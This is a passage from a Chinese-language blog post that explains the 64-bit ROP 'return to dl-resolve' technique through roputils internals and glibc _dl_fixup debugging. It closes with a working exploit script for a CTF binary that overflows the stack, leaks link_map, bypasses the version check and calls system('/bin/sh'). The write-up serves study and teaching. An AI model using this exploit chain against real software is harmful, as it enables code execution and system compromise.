  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span>    <span class="cm">/* Type and binding attributes */</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span>   <span class="cm">/* No defined meaning, 0 */</span>
  <span class="n">Elf64_Half</span> <span class="n">st_shndx</span><span class="p">;</span>      <span class="cm">/* Associated section index */</span>
  <span class="n">Elf64_Addr</span> <span class="n">st_value</span><span class="p">;</span>      <span class="cm">/* Value of the symbol */</span>
  <span class="n">Elf64_Xword</span> <span class="n">st_size</span><span class="p">;</span>      <span class="cm">/* Associated symbol size */</span>
<span class="p">}</span> <span class="n">Elf64_Sym</span><span class="p">;</span></code></pre></figure>

<p>可以看到，<code class="highlighter-rouge">st_info</code>，<code class="highlighter-rouge">st_other</code>等的位置被提前了。对应于roputils中的代码则为：</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">        <span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;IIQQ'</span><span class="p">,</span> <span class="n">st_name</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>             <span class="c"># Elf64_Sym</span></code></pre></figure>

<p>以上便是相关结构的变更情况。接下来，我们看roputils中传递函数参数的相关代码。</p>

<p>首先，看看64位下<code class="highlighter-rouge">.plt</code>中解析函数地址的代码：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">gdb-peda$ </span>x/3i <span class="nb">read
   </span>0x400420 &lt;<span class="nb">read</span>@plt&gt;: jmp    QWORD PTR <span class="o">[</span>rip+0x200582]        <span class="c"># 0x6009a8 &lt;read@got.plt&gt;</span>
   0x400426 &lt;<span class="nb">read</span>@plt+6&gt;:       push   0x1
   0x40042b &lt;<span class="nb">read</span>@plt+11&gt;:      jmp    0x400400
<span class="gp">gdb-peda$ </span>x/2i 0x400400
   0x400400:    push   QWORD PTR <span class="o">[</span>rip+0x20058a]        <span class="c"># 0x600990</span>
   0x400406:    jmp    QWORD PTR <span class="o">[</span>rip+0x20058c]        <span class="c"># 0x600998</span></code></pre></figure>

<p>可以看到，给<code class="highlighter-rouge">_dl_runtime_resolve</code>传递的参数仍然是两个，但第二个参数已由之前32位的相对<code class="highlighter-rouge">JMPREL</code>的偏移变为该条目的在数组中的index。相应地，roputils在这里也进行了改变：</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">...</span>
        <span class="n">addr_reloc</span><span class="p">,</span> <span class="n">padlen_reloc</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">align</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">jmprel</span><span class="p">,</span> <span class="n">relaent</span><span class="p">)</span>
        <span class="n">reloc_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr_reloc</span> <span class="o">-</span> <span class="n">jmprel</span><span class="p">)</span> <span class="o">/</span> <span class="n">relaent</span>

        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">plt</span><span class="p">())</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="o">.</span><span class="n">p</span><span class="p">(</span><span class="n">reloc_offset</span><span class="p">)</span>
<span class="o">...</span></code></pre></figure>

<p>另外，注意到给<code class="highlighter-rouge">_dl_runtime_resolve</code>传递参数的方式，依然是通过栈，而非一般情况下通过寄存器传递。这是因为此时的寄存器<code class="highlighter-rouge">rdi</code>等中已经存有要解析的函数所需的参数了。具体地，roputils中是通过某些gadget来将所需的参数，如<code class="highlighter-rouge">/bin/sh</code>的地址，保存在寄存器中。</p>

<p>然而，阅读roputils的示例代码，我们发现它还会在解析函数地址之前，将<code class="highlighter-rouge">link_map+0x1c8</code>处设为<code class="highlighter-rouge">NULL</code>。我们试着去掉这一操作，再执行发现遇到segfault了：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span>----------------------------------registers-----------------------------------]
RAX: 0x40033c --&gt; 0x2000200020000
RBX: 0x600efc --&gt; 0x600efc66477747
RCX: 0x155dc00000007
RDX: 0x155dc
RSI: 0x600f20 --&gt; 0x1200200c40
RDI: 0x4002f8 --&gt; 0x6f732e6362696c00 <span class="o">(</span><span class="s1">''</span><span class="o">)</span>
RBP: 0x0
RSP: 0x600da8 --&gt; 0x0
RIP: 0x7ffff7de9448 <span class="o">(</span>&lt;_dl_fixup+120&gt;:   movzx  eax,WORD PTR <span class="o">[</span>rax+rdx<span class="k">*</span>2]<span class="o">)</span>
R8 : 0x600f00 --&gt; 0x600efc --&gt; 0x600efc66477747
R9 : 0x7ffff7dea4e0 <span class="o">(</span>&lt;_dl_fini&gt;:        push   rbp<span class="o">)</span>
R10: 0x7ffff7ffe130 --&gt; 0x0
R11: 0x246
R12: 0x0
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 <span class="o">(</span>carry parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span>-------------------------------------code-------------------------------------]
   0x7ffff7de943b &lt;_dl_fixup+107&gt;:      <span class="nb">test   </span>rax,rax
   0x7ffff7de943e &lt;_dl_fixup+110&gt;:      je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;
   0x7ffff7de9444 &lt;_dl_fixup+116&gt;:      mov    rax,QWORD PTR <span class="o">[</span>rax+0x8]
<span class="gp">=&gt; </span>0x7ffff7de9448 &lt;_dl_fixup+120&gt;:      movzx  eax,WORD PTR <span class="o">[</span>rax+rdx<span class="k">*</span>2]
   0x7ffff7de944c &lt;_dl_fixup+124&gt;:      and    eax,0x7fff
   0x7ffff7de9451 &lt;_dl_fixup+129&gt;:      lea    rdx,[rax+rax<span class="k">*</span>2]
   0x7ffff7de9455 &lt;_dl_fixup+133&gt;:      mov    rax,QWORD PTR <span class="o">[</span>r10+0x2e0]
   0x7ffff7de945c &lt;_dl_fixup+140&gt;:      lea    r8,[rax+rdx<span class="k">*</span>8]
<span class="o">[</span>------------------------------------stack-------------------------------------]
0000| 0x600da8 --&gt; 0x0
0008| 0x600db0 --&gt; 0x600f20 --&gt; 0x1200200c40
0016| 0x600db8 --&gt; 0x0
0024| 0x600dc0 --&gt; 0x0
0032| 0x600dc8 --&gt; 0x0
0040| 0x600dd0 --&gt; 0x7ffff7defd00 <span class="o">(</span>&lt;_dl_runtime_resolve+80&gt;:    mov    r11,rax<span class="o">)</span>
0048| 0x600dd8 <span class="o">(</span><span class="s2">"jweM5ZXF"</span><span class="o">)</span>
0056| 0x600de0 --&gt; 0x0
<span class="o">[</span>------------------------------------------------------------------------------]</code></pre></figure>

<p>这其中，<code class="highlighter-rouge">rax=0x40033c</code>是<code class="highlighter-rouge">.gnu.version</code>所在。而这里还存在一处检查。查看<code class="highlighter-rouge">dl-runtime.c</code>文件，这部分对应的代码如下：</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">   <span class="cm">/* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">ST_VISIBILITY</span><span class="p">)</span> <span class="p">(</span><span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_other</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">const</span> <span class="k">struct</span> <span class="n">r_found_version</span> <span class="o">*</span><span class="n">version</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="o">*</span><span class="n">vernum</span> <span class="o">=</span>
        <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]);</span>
      <span class="n">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="n">ndx</span> <span class="o">=</span> <span class="n">vernum</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="mh">0x7fff</span><span class="p">;</span>
      <span class="n">version</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_versions</span><span class="p">[</span><span class="n">ndx</span><span class="p">];</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">version</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="n">version</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>这里，应该是由于我们构造的伪symbol的index过大，使得<code class="highlighter-rouge">vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code>读取出错。为了绕过这部分，roputils选择的方法便是令<code class="highlighter-rouge">l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</code>。相关的汇编代码如下：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">...
   0x00007ffff7de9434 &lt;+100&gt;:   mov    rax,QWORD PTR <span class="o">[</span>r10+0x1c8]
   0x00007ffff7de943b &lt;+107&gt;:   <span class="nb">test   </span>rax,rax
   0x00007ffff7de943e &lt;+110&gt;:   je     0x7ffff7de9530 &lt;_dl_fixup+352&gt;
   0x00007ffff7de9444 &lt;+116&gt;:   mov    rax,QWORD PTR <span class="o">[</span>rax+0x8]
<span class="gp">=&gt; </span>0x00007ffff7de9448 &lt;+120&gt;:   movzx  eax,WORD PTR <span class="o">[</span>rax+rdx<span class="k">*</span>2]
   0x00007ffff7de944c &lt;+124&gt;:   and    eax,0x7fff
...</code></pre></figure>

<p>这里的<code class="highlighter-rouge">r10</code>保存的便是<code class="highlighter-rouge">link_map</code>的地址，所以只需<code class="highlighter-rouge">QWORD PTR [r10+0x1c8]</code>处为<code class="highlighter-rouge">NULL</code>即可跳过这一段。这便是roputils中这一操作的由来。</p>

<h2 id="section">实例</h2>

<p>这里选取的是去年ISG初赛的pwnme。这是一道漏洞很明显，但利用起来较复杂的题目。二进制文件基本信息如下：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>checksec --file pwnme 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   pwnme</code></pre></figure>

<p>主函数内即存在溢出，具体汇编代码如下：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">...
  4005bd:       55                      push   %rbp
  4005be:       48 89 e5                mov    %rsp,%rbp
  4005c1:       48 83 ec 10             sub    <span class="nv">$0x10</span>,%rsp
  4005c5:       bf 3c 00 00 00          mov    <span class="nv">$0x3c</span>,%edi
  4005ca:       e8 c1 fe ff ff          callq  400490 &lt;alarm@plt&gt;
  4005cf:       ba 13 00 00 00          mov    <span class="nv">$0x13</span>,%edx
  4005d4:       be 84 06 40 00          mov    <span class="nv">$0x400684</span>,%esi
  4005d9:       bf 01 00 00 00          mov    <span class="nv">$0x1</span>,%edi
  4005de:       e8 9d fe ff ff          callq  400480 &lt;write@plt&gt;
  4005e3:       48 8d 45 f0             lea    -0x10<span class="o">(</span>%rbp<span class="o">)</span>,%rax
  4005e7:       ba 00 01 00 00          mov    <span class="nv">$0x100</span>,%edx
  4005ec:       48 89 c6                mov    %rax,%rsi
  4005ef:       bf 00 00 00 00          mov    <span class="nv">$0x0</span>,%edi
  4005f4:       e8 a7 fe ff ff          callq  4004a0 &lt;<span class="nb">read</span>@plt&gt;
  4005f9:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
  4005fe:       c9                      leaveq
  4005ff:       c3                      retq
...</code></pre></figure>

<p>可以看到，这里有调用<code class="highlighter-rouge">read</code>和<code class="highlighter-rouge">write</code>，可供我们读写内存。但由于二进制文件本身较简略，构造ROP chain比较有技术含量。我们队当时并没有做出来这道题，赛后看writeup，大多是利用ROP来mem leak，读取足够的内存后构造出<code class="highlighter-rouge">execve</code>得到shell。</p>

<p>但是，如果使用return to dl-resolve技术，利用roputils，则可以1分钟之内傻瓜式解决……我就只是把roputils自带的examples中的<code class="highlighter-rouge">dl-resolve-x86-64.py</code>稍作修改即完成。改后的代码如下：</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python2</span>

<span class="kn">from</span> <span class="nn">roputils</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">fpath</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x18</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">fpath</span><span class="p">)</span>
<span class="n">addr_stage</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">section</span><span class="p">(</span><span class="s">'.bss'</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x400</span>
<span class="n">ptr_ret</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">section</span><span class="p">(</span><span class="s">'.fini'</span><span class="p">))</span>

<span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">retfill</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">call_chain_ptr</span><span class="p">(</span>
    <span class="p">[</span><span class="s">'write'</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">rop</span><span class="o">.</span><span class="n">got</span><span class="p">()</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">],</span>
    <span class="p">[</span><span class="s">'read'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr_stage</span><span class="p">,</span> <span class="mi">420</span><span class="p">]</span>
<span class="p">,</span> <span class="n">pivot</span><span class="o">=</span><span class="n">addr_stage</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">Proc</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">fpath</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x13</span><span class="p">)</span>
<span class="n">addr_link_map</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">read_p64</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s">"link_map is at </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr_link_map</span><span class="p">))</span>
<span class="n">addr_dt_debug</span> <span class="o">=</span> <span class="n">addr_link_map</span> <span class="o">+</span> <span class="mh">0x1c8</span>

<span class="n">buf</span> <span class="o">=</span> <span class="n">rop</span><span class="o">.</span><span class="n">call_chain_ptr</span><span class="p">(</span>
    <span class="p">[</span><span class="s">'read'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr_dt_debug</span><span class="p">,</span> <span class="mi">8</span><span class="p">],</span>
    <span class="p">[</span><span class="n">ptr_ret</span><span class="p">,</span> <span class="n">addr_stage</span><span class="o">+</span><span class="mi">400</span><span class="p">]</span>
<span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">addr_stage</span><span class="o">+</span><span class="mi">300</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">300</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">addr_stage</span><span class="o">+</span><span class="mi">300</span><span class="p">,</span> <span class="s">'system'</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">string</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">420</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">write_p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interact</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span></code></pre></figure>

<p>确实相比mem leak构造ROP，简洁太多了……</p>

<h2 id="section-1">总结</h2>

<p>之前，我的ROP方式，基本都是通过mem leak，读<code class="highlighter-rouge">.got.plt</code>，找到<code class="highlighter-rouge">system</code>的地址并调用；极少数情况下，无法mem leak，则是完全根据已有的gadget拼出ROP cain（见<a href="http://rk700.github.io/writeup/2014/11/14/unexploitable/">http://rk700.github.io/writeup/2014/11/14/unexploitable/</a>）。现在，有了return to dl-resolve，就添加了一种思路。当然，对于64位，这种技术依然需要有读、写内存的gadgets。从理论上讲，有了这些gadgets, mem leak去找<code class="highlighter-rouge">system</code>的地址应该也可以。但相对来说，return to dl-resolve显得简洁、优雅一些。现在64位return to dl-resolve需要读内存，是为了找到<code class="highlighter-rouge">link_map+0x1c8</code>的地址以便写入。如果能够继续研究出不需要读内存的方法，则面对当下主流的64位NX, ASLR，return to dl-resolve的可适性会更加高。希望感兴趣的小伙伴可以一同讨论研究，完善这一技术。</p>

<h2 id="section-2">参考</h2>
<p><a href="http://phrack.org/issues/58/4.html#article">http://phrack.org/issues/58/4.html#article</a></p>

<p><a href="http://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html">http://docs.oracle.com/cd/E23824_01/html/819-0690/chapter6-42444.html</a></p>

<p><a href="https://www.cs.stevens.edu/~jschauma/631/elf.html">https://www.cs.stevens.edu/~jschauma/631/elf.html</a></p>

<p><a href="http://inaz2.hatenablog.com/entry/2014/07/27/205322">http://inaz2.hatenablog.com/entry/2014/07/27/205322</a></p>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="glyphicon glyphicon-open"></i></li>
      
      


  
     
    	<li><a href="http://rk700.github.io/categories.html#article-ref">
    		article <span>16</span>
    	</a></li>
    
  


    </ul>
    

  
    <ul class="tag_box inline">
      <li><i class="glyphicon glyphicon-tags"></i></li>
      
      


  
     
    	<li><a href="http://rk700.github.io/tags.html#exploit-ref">exploit <span>38</span></a></li>
    
  



    </ul>
    
  
    <hr>
    <ul class="pagination">
    
      <li class="prev"><a href="http://rk700.github.io/writeup/2015/04/25/0ctf-0ops-app" title="0CTF 0ops app">« Previous</a></li>
    
      <li><a href="http://rk700.github.io/archive.html">Archive</a></li>
    
      <li class="next"><a href="http://rk700.github.io/article/2016/03/14/algebra" title="密码学相关的一些代数">Next »</a></li>
    
    </ul>
    <hr>
    


  <div id="disqus_thread"></div>
<script type="text/javascript">
    
    var disqus_shortname = 'rk700'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the &lt;a href="http://disqus.com/?ref_noscript"&gt;comments powered by Disqus.&lt;/a&gt;</noscript>
<a href="http://disqus.com/" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




  </div>
</div>


      </div>

    </div>
     <div id="footer">
         <div class="container">
             <p>© 2016 rk700
             with help from <a href="http://jekyllbootstrap.com/" target="_blank" title="The Definitive Jekyll Blogging Framework">Jekyll Bootstrap</a>
             and <a href="http://twitter.github.com/bootstrap/" target="_blank">Twitter Bootstrap</a>

             subscribe <a href="http://rk700.github.io/rss.xml">via RSS</a>
             </p>
         </div>
     </div>


    


    <!-- Latest compiled and minified JavaScript, requires jQuery 1.x (2.x not supported in IE8) -->
    <!-- Placed at the end of the document so the pages load faster -->
    <!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script> -->
    <script src="./ROP之return to dl-resolve_files/bootstrap.min.js.下载"></script>
  


</body></html>